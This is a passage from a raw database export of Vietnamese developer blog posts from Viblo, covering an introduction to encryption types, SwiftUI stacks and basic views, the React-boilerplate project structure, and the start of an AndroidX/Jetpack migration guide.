khai) là phương pháp mã hóa mà key mã hóa (lúc này gọi là public key – khóa công khai) và key giải mã (lúc này gọi là private key – khóa bí mật) khác nhau. Nghĩa là key ta sử dụng để mã hóa dữ liệu sẽ khác với key ta dùng để giải mã dữ liệu. Tất cả mọi người đều có thể biết được public key (kể cả hacker), và có thể dùng public key này để mã hóa thông tin. Nhưng chỉ có người nhận mới nắm giữ private key, nên chỉ có người nhận mới có thể giải mã được thông tin.\n\nĐể thực hiện mã hóa bất đối xứng thì:\n\n* Bên nhận sẽ tạo ra một gặp khóa (public key và private key). Bên nhận sẽ dữ lại private key và truyền cho bên gửi public key. Vì public key này là công khai nên có thể truyền tự do mà không cần bảo mật.\n* Bên gửi trước khi gửi dữ liệu sẽ mã hóa dữ liệu bằng thuật toán mã hóa bất đối xứng với key là public key từ bên nhận.\n* Bên nhận sẽ giải mã dữ liệu nhận được bằng thuật toán được sử dụng ở bên gửi, với key giải mã là private key.\n\nĐiểm yếu lớn nhất của mã hóa bất đối xứng là tốc độ mã hóa và giải mã rất chậm so với mã hóa đối xứng, nếu dùng mã hóa bất đối xứng để mã hóa dữ liệu truyền – nhận giữa hai bên thì sẽ tốn rất nhiều chi phí.\n\nDo đó, ứng dụng chỉnh của mã hóa bất đối xứng là dùng để bảo mật secret key cho mã hóa đối xứng: Ta sẽ dùng phương pháp mã hóa bất đối xứng để truyền secret key của bên gửi cho bên nhận. Và hai bên sẽ dùng secret key này để trao đổi thông tin bằng phương pháp mã hóa đối xứng.\n\nThuật toán mã hóa bất đối xứng thường thấy: RSA.\n![](https://images.viblo.asia/4fbac312-eac2-41d1-b69f-edc86759df69.png)\n\n# Lời kết\nTôi hy vọng bài viết cung cấp cho các bạn những thông tin hữu ích và tổng quan về các hệ mật mã - một ngành khoa học cực kỳ lý thú.\n\nNguồn: Tổng hợp từ Internet	Giới thiệu\nTrong cuộc sống ngày nay, mạng internet có lẻ đã trở thành một thứ không thể thiếu đối với chúng ta. Mạng internet giúp chúng ta tra cứu thông tin, làm việc, học tập, kết nối với mọi người. Nếu thiếu nó thì có lẻ thế giới này sẽ trở lên lạc hậu hơn rất nhiều so với bây giờ.\n\nVậy có bao giờ bạn nghĩ đến thực chất internet là gì, mà tại sao nó lại quan trọng đến vậy? Về cơ bản, ta có t...	{https://images.viblo.asia/0d9be7dd-2cb3-4c62-9e97-000b92e76625.jpg,https://images.viblo.asia/b0f0ea48-4c3d-4d74-b078-c83020e9e742.png,https://images.viblo.asia/53960f76-4932-4add-b0d5-86f4c63968a1.png,https://images.viblo.asia/4fbac312-eac2-41d1-b69f-edc86759df69.png}	1	Giới thiệu các loại thuật toán mã hoá dữ liệu	{encryption,information-security,cryptography}	0	f	2022-12-18 15:33:38.143+00	2022-12-18 15:33:38.143+00
31968	Xin chào mọi người, chắc hẳn sau sự kiện gần đây của Apple các bạn đều rất hứng thú với SwiftUI và Combine. Đây là 2 framework mới mà được Apple khoe với đại ý rằng "Code ít hơn, hiệu năng cao hơn".\nTrong bài viết này chúng ta sẽ cùng làm quen với VStack, HStack, ZStack, List, NavigationView. \n### VStack\nVStack là một view mà các view con bên trong nó sẽ được sắp xếp theo chiều dọc. VStack này tương tự với thằng Vertical Stack View trước đây.\nVí dụ mình muốn tạo UI với một Image ở trên, ngay bên dưới của Image sẽ là title. Trong phần body, mình chỉ cần tạo ra một VStack như dưới đây.\n```\nvar body: some View {\n        VStack {\n            Image("Intro1") //Image name\n            Text("Moon") // Trong SWiftUI thì UILabel đã bị đổi thành Text\n        }\n    }\n```\nKết quả: \n![](https://images.viblo.asia/20dc7c9f-f172-4337-8652-426106798b32.png)\n### HStack\nCũng tương tự vơi Vstack, thay vì sắp xếp các view con theo chiều dọc thì HStack sắp xếp các view con theo chiều ngang. HStack tương tự với thằng Horizontal Stack View.\nNhư ví dụ ở trên, thay vì mình sử dụng VStack, giờ mình sẽ thay bằng HStack, và sửa lại 1 chút cho ảnh nhỏ lại.\n```\nHStack {\n            Image("Intro1").resizable().frame(width: 200, height: 200).clipShape(Circle())\n                .overlay(Circle().stroke(Color.green, lineWidth: 2)).shadow(radius: 1) //Image name\n            Text("Moon").font(.title) // Trong SWiftUI thì UILabel đã bị đổi thành Text\n        }\n```\nKết quả:\n![](https://images.viblo.asia/3824126e-1936-480f-90d0-74559780acce.png)\n=> Như ở trong ảnh trên, mình thấy SwiftUI rất tiện, nó cung cấp sẵn cho chúng ta một số thuộc tính rất hữu ích. Ví dụ với Image ở trên, chúng ta có thể dễ dàng clip, set border, show radius.\n\n### ZStack\nZStack là một view mà nó sẽ sắp xếp các view con đè lên nhau. Trong ZStack, view con nào được tạo cuối cùng thì sẽ được đưa lên trên cùng.\nGiờ hãy cùng sửa HStack ở ví dụ trên thành ZStack. Mình sẽ thêm **.color(Color.red)** cho Text.\n```\nZStack(alignment: .center) { //chúng ta có thể set alignment cho ZStack, mặc định là center\n            Image("Intro1").resizable().frame(width: 200, height: 200).clipShape(Circle())\n                .overlay(Circle().stroke(Color.green, lineWidth: 2)).shadow(radius: 1) //Image name\n            Text("Moon").font(.title).color(Color.red) // Trong SWiftUI thì UILabel đã bị đổi thành Text\n        }\n```\nKết quả:\n![](https://images.viblo.asia/a2cd044a-452f-4e25-a1d0-00301aaf53af.png)\n\n### List\nTrong SwiftUI chúng ta sẽ làm việc với List thay vì TableView như trước đây. \n> A container that presents rows of data arranged in a single column\n\nNhư trước đây, để làm việc với TableView, chúng ta cần phải tạo ra cell, set reuseidentifier, register nib. Nhưng với SwiftUI, chúng ta chỉ cần tạo ra một view cho cell đó.\nVí dụ dưới đây mình sẽ tạo ra 1 list thời tiết của vài thành phố.\n##### Tạo object\n```\n\nimport SwiftUI\n\nstruct Weather: Identifiable {\n    var id = UUID()\n    var image: String\n    var temp: Int\n    var city: String\n}\n\n```\n##### Tạo Cell\n```\nimport SwiftUI\n\nstruct WeatherCell : View {\n    var weather: Weather\n \n    var body: some View {\n        HStack { Image(weather.image).resizable().frame(width: 50, height: 50, alignment: .leading).clipShape(Circle())\n            .overlay(Circle().stroke(Color.green, lineWidth: 2)).shadow(radius: 1)\n            VStack(alignment: .leading) {\n                Text(weather.city).font(.subheadline)\n                Text("\\(weather.temp) ºC").font(.subheadline)\n                \n            }\n        }\n    }\n}\n```\n##### Tạo List với Cell vừa tạo\n```\nimport SwiftUI\n\nstruct ContentView : View {\n    \n    let data: [Weather] = [\n        Weather(image: "Intro1", temp: 28, city: "HN - TP Ha Noi"),\n        Weather(image: "Intro2",   temp: 29, city: "SG - TP  Sai Gon"),\n        Weather(image: "Intro3", temp: 30, city: "DN - TP Da Nang"),\n        Weather(image: "Intro4", temp: 31, city: "PQ - Phu Quoc"),\n        Weather(image: "Intro5", temp: 32, city: "HP - TP Hai Phong")\n    ]\n    \n    var body: some View {\n        List(data) { weather in\n            WeatherCell(weather: weather)\n        }\n    }\n}\n```\n\nKết quả: \n![](https://images.viblo.asia/c17c4c07-c427-4b01-86ff-adf2e4add1e1.png)\n### NavigationView\nNavigationView cũng tương tự với NavigationBar trước đây. \nỞ ví dụ trên, giờ mình muốn thêm title cho màn hình này, đồng thời khi người dùng click vào một item thì sẽ được chuyển sang màn hình khác.\nĐầu tiên, mình sẽ cần tạo ra một màn detail.\n```\nstruct DetailView: View {\n    var title: String\n    var body: some View {\n        VStack {\n            Text(title).color(.red).font(.headline)\n        }\n    }\n}\n```\n\nTiếp theo, mình sẽ sửa lại một chút code, thêm vào NavigationView và NavigationButton để thực hiện việc chuyển màn hình.\n```\nvar body: some View {\n        NavigationView {\n            List(data) { weather in\n                NavigationButton(destination: DetailView(title: weather.city)) { //Action khi click vào cell sẽ điều hướng đến màn hình Detail dựa vào destination\n                    WeatherCell(weather: weather)\n                }\n                }\n                .navigationBarTitle(Text("Weather List")) // Set title cho màn hinh\n        }\n    }\n```\n\n### Kết thúc.\nMình nghĩ rằng đúng như apple nói **Code ít hơn** . Mình thấy việc sử dụng code như thế này khá tiện, live preview cũng khá ok. Tuy nhiên giờ còn khá nhiều lỗi trên bản beta dẫn đến bị treo xcode hoặc k thể preview được mượt mà. Đây chỉ là trên máy mình gặp phải ^^. \nCảm ơn các bạn đã đọc bài viết.\nLink github: https://github.com/dungkv-1044/SwiftUIList	Xin chào mọi người, chắc hẳn sau sự kiện gần đây của Apple các bạn đều rất hứng thú với SwiftUI và Combine. Đây là 2 framework mới mà được Apple khoe với đại ý rằng "Code ít hơn, hiệu năng cao hơn".\nTrong bài viết này chúng ta sẽ cùng làm quen với VStack, HStack, ZStack, List, NavigationView.\nVStack\nVStack là một view mà các view con bên trong nó sẽ được sắp xếp theo chiều dọc. VStack này tương...	{https://images.viblo.asia/20dc7c9f-f172-4337-8652-426106798b32.png,https://images.viblo.asia/3824126e-1936-480f-90d0-74559780acce.png,https://images.viblo.asia/a2cd044a-452f-4e25-a1d0-00301aaf53af.png,https://images.viblo.asia/c17c4c07-c427-4b01-86ff-adf2e4add1e1.png}	1	Cùng làm quen với SwiftUI	{swiftui,ios}	0	f	2022-12-18 15:33:38.174+00	2022-12-18 15:33:38.174+00
31932	Đối với ai đã từng làm việc với ReactJS thì chắc hẳn bạn sẽ có những lúc đau đầu vì không biết phải tổ chức code như nào cho hợp lý. Nhất là khi kết hợp với redux hoặc redux-saga thì project sẽ ngày càng phình to ra. Và đến 1 thời điểm nào đó khi bạn muốn maintain, nhìn lại toàn bộ thư mục Project lộn xộn thì có lẽ bạn sẽ chỉ muốn tắt luôn màn hình. Vậy để làm thế nào để có thể xây dựng và quản lý project 1 cách tốt nhất!? \n\nNếu như lên trang chủ của reactJs thì bạn sẽ được hướng dẫn là sử dụng câu lệnh `create-react-app` để render 1 sample app có setup những package cần thiết cho app. Tuy nhiên thì đó cũng chỉ là sample app mà thôi, còn nếu muốn áp dụng được vào các dự án thực tế thì hôm nay mình sẽ giới thiệu với các bạn 1 best practice có thể gọi là Frame work giành cho ReactJS đó là **React-boilerplate**.\n## **Giới thiệu về React-boilerplate**\nReact-boilerplate là 1 dự án open source, các bạn có thể truy cập vào [đây](https://github.com/react-boilerplate/react-boilerplate) để tìm hiểu về nó. Ngay trên cùng của trang ta có thể đọc được tiêu đề giới thiệu có nội dung là:\n\n> A highly scalable, offline-first foundation with the best developer experience and a focus on performance and best practices.\n> \n<br/>\n\nTheo như lời quảng cáo thì đây là 1 "khuôn mẫu" có tính mở rộng cao, với nền tảng Offline-first, đề cao hiệu năng của ứng dụng và được sự support của những developer nhiều kinh nghiệm nhất trên thế giới. Chỉ nghe qua thôi là đã muốn lao vào để sử dụng nó ngay lập tức rồi.\n\nThật vậy, với việc sử dụng các module hỗ trợ việc bundle gần như là tốt nhất hiện nay như **Babel** hay **Webpack** thì việc nhiều người lựa chọn React-boilerplate cho dự án của mình cũng là điều dễ hiểu. \n\nSau đây chúng ta hãy cùng lướt qua 1 lượt cấu trúc của React-boilerplate\n\n## **Cài đặt môi trường**\nĐầu tiên các bạn clone thằng React-boilerplate này về\n\n` git clone https://github.com/react-boilerplate/react-boilerplate.git  `\n \n Sau đó vào trong folder  `react-boilerplate` và chạy lệnh `npm run setup` để nó tự động setup môi trường. Chú ý là phiên bản node của bạn là phải từ `8.15.1` trở lên thì mới cài được đầy đủ các package. Sau khi cài xong thì ta sẽ được 1 cây thư mục như này:\n \n ![](https://images.viblo.asia/c3994f96-50f0-4d75-ab75-ea61ea3b1696.png)\n## **Modules**\nĐầu tiên chúng ta cùng xem file `package.json` để xem ta sẽ làm việc với những package nào nhé!\n\n![](https://images.viblo.asia/90890dbb-c83d-4ace-9754-65eb03fcd2a9.png)\n\nMình sẽ điểm qua những package mà mọi người cần phải chú ý tới:\n\n- `Babel`, `react`, `redux`, `redux-saga`: Những cái này mọi người quá quen thuộc rồi nên chắc mình không cần phải nói tới nữa :D\n- `connected-react-router` và `react-router-dom` : Đây chính là 2 thằng dùng để điều hướng các route trong app của chúng ta sau này\n- `history`: 1 thư viện của JavaScript để quản lý lịch sử các session. Nó cung cấp cho ta 1 số method để cho việc điều hướng các router trở nên dễ dàng hơn\n- `immer`: Thằng này thì khá là mới, trong những phiên bản React-boilerplate trước thì việc kiểm soát dữ liệu trong store sẽ do `ImmutableJS` đảm nhiệm, tuy nhiên thì do `ImmutableJS` không còn được phát triển nữa nên các developer bên Bp đã thay thế nó bằng `Immer`\n- `intl`: Giống như I18n, React-boilerplate cũng hỗ trợ cho việc sử dụng đa ngôn ngữ trong app\n- `prop-types`: Khai báo type của các Props mà bạn sử dụng\n- `reselect`: reselect là một thư viện giúp cho việc lấy dữ liệu trở nên dễ dàng hơn. React-boilerplate sẽ lưu cache state và select state cho component rất nhanh.\n- `styled-components`: React-boilerplate sử dụng styled component tối ưu hiệu năng tải css trong html, dễ dàng maintain và quản lý. Nôm na bạn có thể hiểu là nó sẽ sử dụng các thuộc tính css như là các Component vậy\n- `jest`: Trong React-boilerplate chúng tra sẽ viết Unit test bằng Jest nhé\n- `prettier`, `eslint`,`stylelint`: Các thư viện dùng để check convention code\n\nNgoài ra còn 1 số thư viện khác có trong project, các bạn cứ tìm hiểu dần cũng được, không cần phải vội đâu :D\n## **App**\nTiếp theo ta sẽ vào trong thư mục, nơi chứa source code chính để xem họ tổ chức code như thế nào nhé.\n\n![](https://images.viblo.asia/957a683a-ffbb-4a9a-b363-08ed9393057c.png)\n\nTrong app thì chúng ta sẽ chú ý tới 2 folder chính đó là **Components** và **Containers**. Đúng như tên gọi thì Component là nơi chứa các component chỉ đơn giản với mục đích là hiển thị ra View, còn Container là nơi giao tiếp với Store nên trong mỗi folder con của Containers sẽ có thêm các file liên quan như là **actions**, **reducer**, **selector**. \n\nVới cách quản lý như này thì khi gặp 1 bug nào đó thì ta có thể nhanh chóng điều tra và khoanh vùng xem lỗi đó xảy ra trong folder nào, như vậy việc debug cũng sẽ trở nên dễ dàng và tốn ít thời gian hơn.\n\nMột điều thú vị nữa là trong Bp họ cũng đã áp dụng React-hooks vào trong code của mình, cho nên sẽ là điều tuyệt với nếu như bạn đang muốn tìm hiểu về Functional Programming trong React.\n## **Configs**\nVề 1 số file config trong app như là: **webpack.base.babel.js, configureStore, babel.config.js, jest.config.js...** hay là các file config dùng để check convention code thì các bạn có thể tự edit lại tuỳ theo yêu cầu của mỗi dự án, không nhất thiết phải giữ nguyên theo thằng React-boilerplate.\n## **Kết luận** <br/>\nNgoài những phần cơ bản mà mình đã giới thiệu ở trên thì React-boilerplate vẫn còn khá nhiều những tính năng khác khá là hay, mà mình nghĩ các bạn có thể tìm hiểu được khi tiếp xúc trực tiếp với nó.\n\nHy vọng qua bài viết này, các bạn có thể tận hưởng được những trải nghiệm tốt nhất khi áp dụng 'FrameWork' React-boilerplatevào dự án của mình.	Đối với ai đã từng làm việc với ReactJS thì chắc hẳn bạn sẽ có những lúc đau đầu vì không biết phải tổ chức code như nào cho hợp lý. Nhất là khi kết hợp với redux hoặc redux-saga thì project sẽ ngày càng phình to ra. Và đến 1 thời điểm nào đó khi bạn muốn maintain, nhìn lại toàn bộ thư mục Project lộn xộn thì có lẽ bạn sẽ chỉ muốn tắt luôn màn hình. Vậy để làm thế nào để có thể xây dựng và quản...	{https://images.viblo.asia/c3994f96-50f0-4d75-ab75-ea61ea3b1696.png,https://images.viblo.asia/90890dbb-c83d-4ace-9754-65eb03fcd2a9.png,https://images.viblo.asia/957a683a-ffbb-4a9a-b363-08ed9393057c.png}	1	Cùng tìm hiểu về React-boilerplate	{reactjs}	0	f	2022-12-18 15:33:38.195+00	2022-12-18 15:33:38.195+00
31867	![](https://images.viblo.asia/d6388f1c-909c-4310-a857-93741dd0c0b4.jpeg)\n## #Mở đầu\nTại sự kiện WWDC 2019, Apple đã giới thiệu một thay đổi lớn đối với các lập trình viên iOS đó là **SwiftUI** - bộ toolkit cho phép các nhà phát triển thiết kế các ứng dụng declarative UI (thay vì imperative UI như trước đây -  dùng oultet, storyboard.. ) trên cả iOS, MacOS, TvOS .\n## #SwiftUI\nTrước khi tìm hiểu **SwiftUI** mình xin lưu ý vớ các bạn về **Imperative** và **Declarative** programming:\n* **Imperative programming**:  telling the “machine” how to do something, and as a result what you want to happen will happen.\n* **Declarative programming**:  telling the “machine” what you would like to happen, and let the computer figure out how to do it.\n\nSự khác nhau ở đây là "**how**" và "**what**" , với imperative programming chúng ta sẽ chỉ ra các bước, cách thức thực hiện để cho ra input như mong muốn, còn declarative chúng ta chỉ cần nói input mong muốn còn lại mọi việc machine sẽ xử lý. Liên tưởng đến việc nhờ đứa em lấy giúp quyển sách:\n * **Imperative programming**: bước xuống giường, xuống cầu thang, quẹo phải, mở tủ sách, lấy sách tên...\n * **Declarative programming**: lấy giúp tao quyển sách đê =)) \n \n \n**SwiftUI** là một frameworks giúp tạo ra các declarative UI, tức là deveoloper chỉ cần định nghĩa ra  giao diện mong muốn, mọi việc resize, scale, self-sizing... SwiftUI sẽ xử lý :v:\n\nMột số ưu điểm của **SwiftUI**:\n* Sử dụng declarative syntax rất "hiện đại", quen thuộc với các bạn đã từng làm Flutter hoặc React.\n* Support Self-sizing.\n* Code ngắn gọn dễ hiểu.\n* Có thể tổ chức view kiểu component nên dễ dàng reuse.\n* Tự động update UI khi data state thay đổi.\n* Hỗ trợ dynamic type và dark mode.\n\n## #Basic View\nTrong bài viết này mình sẽ giới thiệu với các bạn một số đối tượng View cơ bản trong SwiftUI:\n\n### Text\n\n```swift\nText("SwiftUI")\n    .color(.orange)\n    .bold()\n    .font(.system(.largeTitle))\n    .fontWeight(.medium)\n    .italic()\n    .shadow(color: .black, radius: 1, x: 0, y: 2)\n```\n\n\nExample:\n![](https://images.viblo.asia/e0ac4a64-5b86-4b2f-b1d1-85c296ecb5d4.png)\n\n### TextField - SecureField\n\n```swift\n\nTextField(self.$name, placeholder: self.nameText, \nonEditingChanged: { changed in\n    print("onEditing: \\(changed)")\n}) {\n    print("userName: \\(self.name)")\n    self.endEditing(true)\n}}\n.padding(10)\n.frame(height: 50)\n.textFieldStyle(.roundedBorder)\n.padding(EdgeInsets(top: 0, leading: 20, bottom: 0, trailing: 20))\n\n```\n\nExample:\n![](https://images.viblo.asia/c3f896b3-cb81-431e-ad6a-68bfe601dd2a.png)\n\n### WebImage\n\n```swift\nvar body: some View {\n        Image(uiImage: self.uiImage ?? placeholderImage)\n            .resizable()\n            .onAppear(perform: downloadWebImage)\n            .frame(width: Length(80),\n                   height: Length(80),\n                   alignment: .center)\n            .tapAction {\n                print("Tap ")\n        }\n    }\n```\n\nExample:\n![](https://images.viblo.asia/13d27286-78ea-4ba1-a56a-69614eebf6dc.png)\n\n### Button\n\n```swift\nButton(action: {\n    print("Tap")\n}) {\n   Text("I'm a Button")\n}\n```\n\nExample:\n![](https://images.viblo.asia/0f3246c6-36c7-4642-9eda-c137ddc188a9.png)\n\n### Picker\n```swift\nPicker(selection: $leftIndex, label: Text("Picker")) {\n    ForEach(0..<leftSource.count) {\n        Text(self.leftSource[$0]).tag($0)\n    }\n }.frame(width: UIScreen.main.bounds.width/2)\n```     \n\nExample:\n![](https://images.viblo.asia/91bdfafe-bfe0-49f3-914c-a87bdbf5310f.png)\n\n### DatePicker\n```swift\nDatePicker(\n    $server.date,\n    minimumDate: Calendar.current.date(byAdding: .year,\n                                       value: -1,\n                                       to: server.date),\n    maximumDate: Calendar.current.date(byAdding: .year,\n                                       value: 1,\n                                       to: server.date),\n    displayedComponents: .date\n)\n```   \n\nExample:\n![](https://images.viblo.asia/5e07df79-8abe-4bc4-a6fc-618acb6b90f6.png)\n\n### Slider\n```swift\n    Slider(value: $data.rating)\n```   \n\nExample:\n![](https://images.viblo.asia/8e14db35-5f69-4ceb-996b-1500968ad801.png)\n\n### Stepper\n```swift\nStepper(value: $value, step: 2, onEditingChanged: { c in\n    print(c)\n}) {\n    Text("Stepper Value: \\(self.value)")\n}.padding(50)\n```   \n\nExample:\n![](https://images.viblo.asia/e8c277d6-9629-4fd7-9681-453cb2fc87b0.png)\n\n### SegmentedControl\n```swift\nSegmentedControl(selection: $currentIndex) {\n    ForEach(0..<items.count) { index in\n        Text(self.items[index]).tag(index)\n    }\n    }.tapAction {\n        print("currentIndex: \\(self.currentIndex)")\n}\n```   \n\nExample:\n![](https://images.viblo.asia/07bc176b-2464-4e2c-8994-2289d167a4de.png)\n\n### WebView\n```swift\nstruct WebViewPage : UIViewRepresentable {\n    func makeUIView(context: Context) -> WKWebView  {\n        return WKWebView()\n    }\n    \n    func updateUIView(_ uiView: WKWebView, context: Context) {\n        let req = URLRequest(url: URL(string: "https://www.apple.com")!)\n        uiView.load(req)\n    }\n}\n```   \nExample:\n![](https://images.viblo.asia/375cf634-1359-4001-a401-5530fb5dcc3b.png)\n\n### List\n```swift\nList(0..<5) { item in\n    Text("Hello World !")\n}.navigationBarTitle(Text("List"), displayMode: .large)\n```   \nExample:\n![](https://images.viblo.asia/853cba0b-338e-4597-a438-d218341fa479.png)\n\n### NavigationView\n```swift\nNavigationView {\n    Text("🧚‍♂️🧚‍♀️🧜‍♂️🧜‍♀️🧞‍♂️🧞‍♀️").blur(radius: 5)\n    Text("Swifter Swifter").bold().color(.orange).font(.largeTitle)\n}.navigationBarTitle(Text("NavigationView"))\n```   \n\nExample:\n![](https://images.viblo.asia/d592bb40-0b1d-46b1-8ae2-5ef6e855092b.png)\n\n### TabBar\n```swift\nTabbedView(selection: $index) {\n    ForEach(0 ..< imgs.count) { item in\n        TabItemPage(index: item)\n            .tabItemLabel(Image(self.imgs[item]))\n            .tag(item)\n    }\n}\n```  \n\nExample:\n![](https://images.viblo.asia/bee5a34d-5f73-4b5d-b90a-c8c783aac5ba.png)\n\n### Alert\n```swift\npresentation($showsAlert,\n        alert: {\n                Alert(title: Text("Hello"))\n       })\n```  \n\nExample:\n![](https://images.viblo.asia/4d87f020-b02e-4c7f-b851-189335ae1c2e.png)\n\n### ActionSheet\n```swift\nActionSheet(title: Text("Title"),\n            message: Text("Message"),\n            buttons:\n    [.default(Text("Default"), onTrigger: {\n        print("Default")\n        self.showSheet = false\n    }),.destructive(Text("destructive"), onTrigger: {\n        print("destructive")\n        self.showSheet = false\n    }),.cancel({\n        print("Cancel")\n        self.showSheet = false\n    })])\n```  \n\nExample:\n![](https://images.viblo.asia/50dd0ea5-3419-4d30-9ca5-15c23b62cd71.png)\n\n## #Kết\nTrên đây là bài giới thiệu cơ bản về **SwiftUI**, dễ dàng nhận thấy **SwiftUI** sẽ mang đến cho chúng ta một phong cách thiết kế ứng dụng khác với trước đây, việc xây dựng giao diện sẽ nhanh chóng và ngắn gọn hơn, việc binding dữ liệu cũng trở nên nhẹ nhàng hơn trước. Tuy nhiên vì chỉ hoạt động trên iOS 13 trở về sau nên việc áp dụng **SwiftUI** trong các project sẽ còn phải đợi 1 - 2 năm nửa, nhưng chúng ta nên đầu tư từ bây giờ để sau này khỏi phải bỡ ngỡ, chắc chắn  **SwiftUI** sẽ là một cái gì đó rất là này nọ để giúp cho việc phát triển các ứng dụng iOS trở nên "trong sáng" và dễ dàng hơn.\n\nỞ phần sau mình sẽ giới thiệu với các bạn về cách layout với **SwiftUI**, hẹn gặp lại .\n\nLink tham khảo: https://github.com/Jinxiansen/SwiftUI	![](https://images.viblo.asia/d6388f1c-909c-4310-a857-93741dd0c0b4.jpeg)\n\n\n#Mở đầu\nTại sự kiện WWDC 2019, Apple đã giới thiệu một thay đổi lớn đối với các lập trình viên iOS đó là SwiftUI - bộ toolkit cho phép các nhà phát triển thiết kế các ứng dụng declarative UI (thay vì imperative UI như trước đây -  dùng oultet, storyboard.. ) trên cả iOS, MacOS, TvOS .\n#SwiftUI\nTrước khi tìm hiểu SwiftUI mình xin lưu ý vớ các bạn về Imperative và Declarative programming:\n* Impe...	{https://images.viblo.asia/d6388f1c-909c-4310-a857-93741dd0c0b4.jpeg,https://images.viblo.asia/e0ac4a64-5b86-4b2f-b1d1-85c296ecb5d4.png,https://images.viblo.asia/c3f896b3-cb81-431e-ad6a-68bfe601dd2a.png,https://images.viblo.asia/13d27286-78ea-4ba1-a56a-69614eebf6dc.png,https://images.viblo.asia/0f3246c6-36c7-4642-9eda-c137ddc188a9.png,https://images.viblo.asia/91bdfafe-bfe0-49f3-914c-a87bdbf5310f.png,https://images.viblo.asia/5e07df79-8abe-4bc4-a6fc-618acb6b90f6.png,https://images.viblo.asia/8e14db35-5f69-4ceb-996b-1500968ad801.png,https://images.viblo.asia/e8c277d6-9629-4fd7-9681-453cb2fc87b0.png,https://images.viblo.asia/07bc176b-2464-4e2c-8994-2289d167a4de.png,https://images.viblo.asia/375cf634-1359-4001-a401-5530fb5dcc3b.png,https://images.viblo.asia/853cba0b-338e-4597-a438-d218341fa479.png,https://images.viblo.asia/d592bb40-0b1d-46b1-8ae2-5ef6e855092b.png,https://images.viblo.asia/bee5a34d-5f73-4b5d-b90a-c8c783aac5ba.png,https://images.viblo.asia/4d87f020-b02e-4c7f-b851-189335ae1c2e.png,https://images.viblo.asia/50dd0ea5-3419-4d30-9ca5-15c23b62cd71.png}	1	First impressions of SwiftUI	{swiftui,mobile,swift,ios}	0	f	2022-12-18 15:33:38.217+00	2022-12-18 15:33:38.217+00
31884	Google đã rebranded các thư viện hỗ trợ của họ với tên mới là Jetpack (hay còn gọi là AndroidX). Và các Deveploer cần phải thay đổi để phù hợp với việc này.\n\nBài này sẽ nói rõ hơn để trả lời cho câu hỏi, nó là cái gì? Làm thế nào để có thể bắt đầu chuyển đổi ứng dụng của bạn để sử dụng thành phần mới này?\n\n![]([https://miro.medium.com/max/600/1*OFJKA8dRYZSb-Kprx-VReg.png)\n\n## Jetpack là gì\n\n[Android Jetpack](https://developer.android.com/jetpack/) là một tập hợp các thư viện, công cụ (tools) và hướng dẫn về kiến trúc, nó được thiết kế để xây dựng một ứng dụng Android một cách dễ dàng. Nó cung cấp code nền tảng chung để nhà phát triển có thể tập trung vào việc viết những thứ làm cho ứng dụng trở nên độc đáo.\n\nĐó là một nỗ lực với phạm vi lớn để cải thiện trải nghiệm của nhà phát triển và tập các các công cụ và nền tảng hữu dụng tạo thành một đơn vị gắn kết chặt chẽ.\n\nDưới đây là trích dẫn từ [Alan Viverette](https://twitter.com/alanviverette) (Android Framework team) là một tóm tắt hay:\n\n> “Jetpack is a larger-scoped effort to improve developer experience, but AndroidX forms the technical foundation. From a technical perspective, it’s still the same libraries you’d have seen under Support Library and Architecture Components.”\n\n## Tại sao?\n\nTại sao Google đang trải qua tất cả những rắc rối này (và tạo ra những rắc rối này cho các nhà phát triển)?\n\n- Tạo một namespace nhất quán (androidx.* ) Cho các thư viện hỗ trợ\n- Hỗ trợ phân chia các phiên bản một cách tốt hơn (bắt đầu với 1.0.0). Điều này khiến chúng có thể được cập nhật một cách độc lập.\n- Phát triển một core chung để hỗ trợ tất cả các thành phần đi theo\n\nĐiều rất quan trọng được nhắc tới ở đây là. Version hiện tại của AppCompat (v28.x) là version được release cuối cùng. Trong các version tiếp theo sẽ sử dụng duy nhất Jetpack. Điều này bắt buộc các lập trình viên phải có được nhận thức và chuyển đổi sớm sang sử dụng Jetpack.\n\nĐây là trích dẫn của Alan Viverette\n\n> “There won’t be a 29.0.0, so Android Q APIs will only be in AndroidX” \n\n## Có những gì trong Jetpack?\n\nCâu trả lời ở đây là: mọi thứ\n\nJetpack là một tập hợp rất nhiều các thư viện đã có mà chúng ta đa phần phải sử dụng (giống như AppCompat, Permission, Notification and Transitions) và mới hơn là các Architecture Components được giới thiệu trong những năm gần đây (giống như LiveData, Room, WorkManager and ViewModel)\n\nNhững nhà phát triển có thể kỳ vọng nhận được cùng một lợi ích tương tự như khi họ sử dụng AppCompat, bao gồm khả năng tương thích ngược và vòng release không bị ảnh hưởng với việc cập nhật các OS.\n\n![Jetpack_components](https://miro.medium.com/max/1400/1*jqDYNqVXgbn8zfC1v6qunQ.png)\n\n## Bạn sẽ nâng cấp ngay bây giờ chứ? Bạn có thể chỉ cập nhật một phần trong code của bạn?\n\nBạn không cập nhật ngày hôm nay, nhưng bạn sẽ phải cập nhật một vài thứ trong một tương lai gần.\n\nPhiên bản hiện tại của AppCompat (v28.x) hoàn toàn giống với AndroidX (v1.x). Trong thực tế, các thư viện AppCompat là được tạo bằng cách thay đổi địa chỉ maven và package name của AndroidX codebase.\n\nVí dụ, vị trí và package cũ là\n```\nimplementation “com.android.support:appcompat-v7:28.0.0"\nimport android.support.v4.widget.DrawerLayout\n```\n\nthì bây giờ sẽ là\n\n```\nimplementation 'androidx.appcompat:appcompat:1.0.2'\nimport androidx.drawerlayout.widget.DrawerLayout\n```\n\nĐiều này rất quan trọng để chú ý, bạn không thể mix AppCompat và Jetpack trong cùng một project. **Bạn cần phải chuyển đổi mọi thứ để sử dụng Jetpack nếu như bạn muốn nâng cấp**\n\n## Bước đầu tiên - Nâng cập ứng dụng của bạn tới thư viện Support phiên bản mới nhất\n\nKhi bạn đã sẵn sàng cập nhật lên Jetpack, hãy đảm bảo ứng dụng của bạn được nâng cấp lên phiên bản mới nhất của Gradle và AppCompat. Điều này sẽ đảm bảo bộ tái cấu trúc chỉ thay đổi package name và không phải là vấn đề lớn hơn liên quan đến cập nhật thư viện.\n\nCập nhật dự án của bạn là vô cùng quan trọng và sẽ cho bạn thấy mọi vấn đề bạn sẽ gặp phải khi tiếp tục phát triển, chẳng hạn như sự phụ thuộc kéo dài vào phiên bản cũ hơn của thư viện. Nếu bạn không thể cập nhật lên các phiên bản mới nhất, bạn sẽ cần khắc phục các sự cố đó trước khi tiếp tục.\n\nĐừng quên kiểm tra [https://maven.google.com/](https://maven.google.com/) để lấy thông tin mới nhất về Gradle dependency.\n\n## Sử dụng Refactor tool để cập nhật project của bạn\n\nKhi bạn đã nâng cấp dự án của mình, bạn sẽ sử dụng tiện 